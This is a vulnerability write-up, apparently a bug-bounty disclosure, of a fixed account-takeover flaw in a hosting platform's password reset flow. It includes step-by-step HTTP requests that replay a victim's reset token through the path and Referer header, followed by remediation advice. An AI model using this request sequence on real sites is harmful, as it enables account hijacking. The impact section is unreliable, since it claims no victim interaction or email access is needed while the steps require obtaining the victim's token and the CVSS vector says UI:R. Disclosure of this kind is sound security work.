# [Write-up #01] Full Account Takeover via Stateful Token Confusion & Referer Leakage

## 📝 Overview
This report demonstrates a critical **Logic Flaw** discovered in a large-scale hosting platform's password reset mechanism. The vulnerability allows an attacker to reset the password of any user by manipulating how the server binds reset tokens to sessions during a multi-stage request process.

* **Vulnerability Type:** Account Takeover (ATO) / Broken Authentication
* **CVSS Score:** `8.1 (High)` -> [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
* **Target Category:** Enterprise Cloud Hosting Provider

---

## 🔍 Vulnerability Analysis
The core issue lies in **Improper Password Reset Token Binding**. The server-side validation logic suffers from a **"State Confusion"** where it fails to maintain a strict one-to-one mapping between the reset token and the session attempting the reset.

The exploit works by leveraging two distinct server behaviors:

1.  **Stage 1 (Token Priming):** Injecting the victim's token into the request path triggers a `302 Found` response. This action "primes" the server-side state, temporarily associating the victim's token with the attacker's current connection.
2.  **Stage 2 (Logic Bypass):** By reverting the request path to the default endpoint but keeping the victim's token in the `Referer` header, the server mistakenly trusts the previously "primed" state and executes the password change on the victim's account instead of the attacker's.

---

## 🚀 Attack Scenario (Step-by-Step)

### 1. Preparation
* **Attacker:** `attacker@example.com`
* **Victim:** `victim@example.com`
* **Tooling:** Burp Suite (Repeater & Interceptor)

### 2. Capturing the Base Request
The attacker initiates a password reset for their own account to capture a valid reset request structure:

```http
POST /auth/passwordreset/ HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/auth/passwordreset/←ATTACKER_TOKEN→

password=NewPass123!&password_confirm=NewPass123!
3. The "Priming" Phase (Critical Injection)
The attacker obtains a victim's reset token and modifies the request line to force the server into a specific state:
POST /auth/passwordreset/←VICTIM_TOKEN→ HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/auth/passwordreset/←VICTIM_TOKEN→

password=AttackerControlledPass!

Server Response: 302 Found

Analysis: This step forces the backend to recognize the victim's token and cache it in the context of the attacker's current session flow.

4. The Execution Phase (Exploitation)
The attacker reverts the path to the original endpoint but maintains the victim's token in the Referer header:
POST /auth/passwordreset/ HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/auth/passwordreset/←VICTIM_TOKEN→

password=AttackerControlledPass!
Server Response: 200 OK

Result: The server validates the Referer, sees the "primed" token from the previous step, and updates the password for the account associated with ←VICTIM_TOKEN→.
🛡️ Impact
Complete Account Takeover: An attacker can gain full access to any user's account without any interaction from the victim.

No Authentication Required: The attacker does not need to know the victim's current password or have access to their email.

Integrity Breach: This flaw bypasses the fundamental security assumption that reset tokens are bound strictly to the user who requested them.
Root Cause & Remediation
Root Cause
The application trusts client-side headers (Referer) and fails to verify that the token provided in the path or header actually belongs to the user session performing the POST request. The use of a "stateful" 302 response to initialize a reset allowed for session-token mismatch.

Remediation Recommendations
Strict Binding: Ensure the password reset token is validated directly against the user ID in the database for every request.

Stateless Validation: Avoid using intermediate steps (like the 302 priming) to set server-side states for password resets.

Ignore Referer for Logic: Never use the Referer header to identify the context of a sensitive action like a password change.

📊 Status
Milestone,Date
Vulnerability Discovered,2026-03-25
Reported to Vendor,2026-03-25
Status,✅ Fixed / Resolved
